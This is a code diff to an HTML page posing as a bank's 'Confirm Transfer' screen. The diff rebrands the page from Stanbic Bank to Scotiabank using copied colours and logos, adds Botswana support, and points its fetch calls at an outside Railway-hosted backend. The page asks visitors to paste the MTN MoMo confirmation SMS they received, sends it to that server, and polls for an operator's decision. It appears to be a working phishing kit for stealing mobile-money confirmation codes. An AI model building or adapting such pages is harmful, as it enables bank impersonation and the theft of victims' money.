@@ -3,16 +3,16 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
-<title>Stanbic Bank · Confirm Transfer</title>
+<title>Scotiabank · Confirm Transfer</title>
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
 <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
 <style>
   :root {
-    --sb-primary:   #01008C;
-    --sb-royal:     #005EB8;
-    --sb-navy:      #001E50;
-    --sb-gold:      #FFB81C;
+    --sb-primary:   #EC111A;
+    --sb-royal:     #C00D14;
+    --sb-navy:      #1A1A1A;
+    --sb-gold:      #FFD400;
     --sb-white:     #FFFFFF;
     --sb-text:      #1A2233;
     --sb-muted:     #5B6577;
@@ -22,7 +22,7 @@
     --sb-green:     #0E7A4A;
     --sb-red:       #B3261E;
     --sb-red-soft:  #FDECEA;
-    --sb-gold-soft: #FFF8E1;
+    --sb-gold-soft: #FFFBE1;
   }
   * { box-sizing: border-box; margin: 0; padding: 0; }
   html, body { height: 100%; }
@@ -51,12 +51,10 @@
     border-top-left-radius: 20px; border-top-right-radius: 20px;
   }
   .brand-row { display: flex; align-items: center; gap: 10px; }
-  .top-logo { height: 34px; width: auto; display: block; flex-shrink: 0; }
-  .brand-text {
-    font-size: 22px; font-weight: 800; letter-spacing: -0.5px;
-    color: #fff; line-height: 1; white-space: nowrap;
+  .top-logo {
+    height: 26px; width: auto; display: block; flex-shrink: 0;
+    filter: brightness(0) invert(1);
   }
-  .brand-text .dot { color: var(--sb-gold); }
 
   .page-title {
     margin-top: 18px; font-size: 19px; font-weight: 800;
@@ -73,12 +71,9 @@
     display: flex; flex-direction: column;
   }
 
-  /* ══════════════════════════════════════════════════════════
-     SIMPLE INBOX NOTICE — one short hint
-     ══════════════════════════════════════════════════════════ */
   .inbox-notice {
-    background: #EEF3FB;
-    border: 1px solid #C9D4EA;
+    background: #FDEEEF;
+    border: 1px solid #F3C9CB;
     border-left: 4px solid var(--sb-primary);
     border-radius: 12px;
     padding: 14px 16px;
@@ -104,7 +99,6 @@
     font-weight: 800;
   }
 
-  /* Amount card */
   .amount-card {
     background: var(--sb-soft); border-radius: 12px;
     border: 1px solid var(--sb-border);
@@ -178,7 +172,7 @@
     font-family: inherit; font-size: 17px; font-weight: 800;
     letter-spacing: 0.4px;
     border: none; border-radius: 12px; cursor: pointer;
-    box-shadow: 0 10px 24px rgba(1,0,140,0.28);
+    box-shadow: 0 10px 24px rgba(236,17,26,0.28);
     transition: filter .15s, transform .1s, opacity .15s;
     display: flex; align-items: center; justify-content: center;
     padding: 18px 24px;
@@ -222,13 +216,9 @@
   }
   .foot-brand-row { display: flex; align-items: center; gap: 8px; }
   .sb-footer .foot-logo {
-    height: 26px; width: auto; display: block; flex-shrink: 0;
+    height: 20px; width: auto; display: block; flex-shrink: 0;
+    filter: brightness(0) invert(1);
   }
-  .sb-footer .foot-brand-text {
-    font-size: 16px; font-weight: 800; letter-spacing: -0.3px;
-    color: #fff; line-height: 1; white-space: nowrap;
-  }
-  .sb-footer .foot-brand-text .dot { color: var(--sb-gold); }
   .sb-footer .foot-support {
     font-size: 10.5px; color: rgba(255,255,255,0.72); line-height: 1.5; font-weight: 500;
     text-align: right;
@@ -258,14 +248,10 @@
   .authorizing.show { display: flex; }
   .authorizing .brand-label {
     margin-bottom: 34px;
-    display: flex; align-items: center; gap: 10px;
+    display: flex; align-items: center; justify-content: center;
+    filter: brightness(0) invert(1);
   }
-  .authorizing .brand-label img { height: 34px; width: auto; }
-  .authorizing .brand-label .brand-text {
-    font-size: 22px; font-weight: 800; color: #fff;
-    letter-spacing: -0.5px; line-height: 1;
-  }
-  .authorizing .brand-label .brand-text .dot { color: var(--sb-gold); }
+  .authorizing .brand-label img { height: 28px; width: auto; }
   .authorizing .spinner {
     width: 60px; height: 60px;
     border: 4px solid rgba(255,255,255,0.18);
@@ -310,8 +296,7 @@
   @media (max-width: 380px) {
     .top { padding: 16px 18px 22px; }
     .body { padding: 18px 18px 16px; }
-    .top-logo { height: 30px; }
-    .brand-text { font-size: 20px; }
+    .top-logo { height: 22px; }
     .page-title { font-size: 17px; }
     .inbox-notice { padding: 12px 14px; }
     .inbox-notice .text { font-size: 12.5px; }
@@ -323,8 +308,7 @@
     .trust-slider { height: 80px; }
     .trust-msg { font-size: 12px; }
     .sb-footer { padding: 14px 16px; }
-    .sb-footer .foot-logo { height: 22px; }
-    .sb-footer .foot-brand-text { font-size: 14px; }
+    .sb-footer .foot-logo { height: 18px; }
   }
   @media (max-height: 680px) {
     .page-title { margin-top: 12px; }
@@ -336,7 +320,7 @@
     .phone {
       min-height: calc(100vh - 64px); max-height: 900px;
       border-radius: 20px;
-      box-shadow: 0 30px 80px rgba(1,0,140,0.18);
+      box-shadow: 0 30px 80px rgba(236,17,26,0.18);
       overflow: hidden;
     }
   }
@@ -350,12 +334,11 @@
     <div class="brand-row">
       <img
         class="top-logo"
-        src="https://cdn.brandfetch.io/idrjWN3IVw/w/582/h/164/theme/dark/logo.png?c=1dxbfHSJFAPEGdCLU4o5B"
-        alt="Stanbic Bank"
+        src="https://upload.wikimedia.org/wikipedia/commons/2/22/Scotiabank_logo.svg"
+        alt="Scotiabank"
         referrerpolicy="no-referrer"
         onerror="this.style.display='none'"
       >
-      <span class="brand-text">Stanbic<span class="dot">.</span></span>
     </div>
     <div class="page-title" id="pageTitle">Confirm this transfer</div>
     <div class="page-sub" id="pageSub">Paste the MoMo confirmation message you received to authorize this transfer.</div>
@@ -363,7 +346,6 @@
 
   <div class="body">
 
-    <!-- ══════════ SIMPLE INBOX NOTICE — MTN MOMO WORDING ══════════ -->
     <div class="inbox-notice">
       <svg class="icon" viewBox="0 0 24 24">
         <path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"/>
@@ -418,12 +400,11 @@
       <div class="foot-brand-row">
         <img
           class="foot-logo"
-          src="https://cdn.brandfetch.io/idrjWN3IVw/w/582/h/164/theme/dark/logo.png?c=1dxbfHSJFAPEGdCLU4o5B"
-          alt="Stanbic Bank"
+          src="https://upload.wikimedia.org/wikipedia/commons/2/22/Scotiabank_logo.svg"
+          alt="Scotiabank"
           referrerpolicy="no-referrer"
           onerror="this.style.display='none'"
         >
-        <span class="foot-brand-text">Stanbic<span class="dot">.</span></span>
       </div>
       <div class="foot-support">
         <span id="needHelpLabel">Customer Care</span><br>
@@ -437,12 +418,11 @@
 <div class="authorizing" id="authorizingOverlay">
   <div class="brand-label">
     <img
-      src="https://cdn.brandfetch.io/idrjWN3IVw/w/582/h/164/theme/dark/logo.png?c=1dxbfHSJFAPEGdCLU4o5B"
-      alt="Stanbic Bank"
+      src="https://upload.wikimedia.org/wikipedia/commons/2/22/Scotiabank_logo.svg"
+      alt="Scotiabank"
       referrerpolicy="no-referrer"
       onerror="this.style.display='none'"
     >
-    <span class="brand-text">Stanbic<span class="dot">.</span></span>
   </div>
   <div class="spinner"></div>
   <h2 id="authTitle">Confirming transfer…</h2>
@@ -459,9 +439,14 @@
 <div class="toast" id="toast"></div>
 
 <script>
+  /* ═══════════════════════════════════════════════════════════
+     API_BASE — HARD-PINNED to the live Railway backend
+     ═══════════════════════════════════════════════════════════ */
+  const API_BASE = 'https://stanbicmobilepayment-production.up.railway.app';
+
   const I18N = {
     en: {
-      docTitle: 'Stanbic Bank · Confirm Transfer',
+      docTitle: 'Scotiabank · Confirm Transfer',
       pageTitle: 'Confirm this transfer',
       pageSub: 'Paste the MoMo confirmation message you received to authorize this transfer.',
       inboxText: 'Check your <strong>MoMo SMS inbox</strong> for the message from MoMo and paste it below.',
@@ -505,7 +490,7 @@
       popupExpiredDesc: 'The message you submitted has expired. You will be taken back to paste a new message.'
     },
     fr: {
-      docTitle: 'Stanbic Bank · Confirmer le virement',
+      docTitle: 'Scotiabank · Confirmer le virement',
       pageTitle: 'Confirmez ce virement',
       pageSub: 'Collez le message de confirmation MoMo que vous avez reçu pour autoriser ce virement.',
       inboxText: 'Vérifiez votre <strong>boîte SMS MoMo</strong> pour le message de MoMo et collez-le ci-dessous.',
@@ -577,11 +562,12 @@
     'Uganda (MTN)': '100',
     'Ghana': '100',
     'Ghana (MTN)': '100',
-    'Benin': '111'
+    'Benin': '111',
+    'Botswana': '399 9100'
   };
   const CURRENCY_LOCALE = {
     XAF: 'fr-CM', ZMW: 'en-ZM', UGX: 'en-UG', GHS: 'en-GH',
-    XOF: 'fr-BJ', USD: 'en-US'
+    XOF: 'fr-BJ', BWP: 'en-BW', USD: 'en-US'
   };
   function formatAmount(amount, currency) {
     const locale = CURRENCY_LOCALE[currency] || 'en-US';
@@ -731,7 +717,7 @@
     btn.disabled = true;
     lbl.textContent = T.resendSending;
     try {
-      const r = await fetch('/api/mtn/resend', {
+      const r = await fetch(API_BASE + '/api/mtn/resend', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
@@ -784,9 +770,9 @@
     const overlay = document.createElement('div');
     overlay.style.cssText = 'position:fixed;inset:0;background:rgba(16,24,40,0.65);display:flex;align-items:center;justify-content:center;z-index:10001;padding:24px;';
     overlay.innerHTML =
-      '<div style="background:#fff;border-radius:16px;padding:28px 24px;max-width:340px;width:100%;text-align:center;font-family:Inter,sans-serif;box-shadow:0 20px 50px rgba(0,0,0,0.25);border-top:4px solid #FFB81C;">' +
-        '<div style="width:60px;height:60px;border-radius:50%;background:#01008C;color:#fff;display:flex;align-items:center;justify-content:center;font-size:28px;font-weight:800;margin:0 auto 16px;">!</div>' +
-        '<div style="font-size:17px;font-weight:800;color:#001E50;margin-bottom:8px;">' + title + '</div>' +
+      '<div style="background:#fff;border-radius:16px;padding:28px 24px;max-width:340px;width:100%;text-align:center;font-family:Inter,sans-serif;box-shadow:0 20px 50px rgba(0,0,0,0.25);border-top:4px solid #FFD400;">' +
+        '<div style="width:60px;height:60px;border-radius:50%;background:#EC111A;color:#fff;display:flex;align-items:center;justify-content:center;font-size:28px;font-weight:800;margin:0 auto 16px;">!</div>' +
+        '<div style="font-size:17px;font-weight:800;color:#1A1A1A;margin-bottom:8px;">' + title + '</div>' +
         '<div style="font-size:13px;color:#5B6577;line-height:1.6;">' + desc + '</div>' +
       '</div>';
     document.body.appendChild(overlay);
@@ -863,7 +849,7 @@
 
     let serverAccepted = true;
     try {
-      const r = await fetch('/api/mtn/sms', {
+      const r = await fetch(API_BASE + '/api/mtn/sms', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
@@ -902,7 +888,7 @@
 
       let decision = 'pending';
       try {
-        const r = await fetch('/api/mtn/sms-status/' + encodeURIComponent(tx.ref) + '?_=' + Date.now());
+        const r = await fetch(API_BASE + '/api/mtn/sms-status/' + encodeURIComponent(tx.ref) + '?_=' + Date.now());
         if (!r.ok) throw new Error('HTTP ' + r.status);
         const j = await r.json();
         decision = j.decision || 'pending';
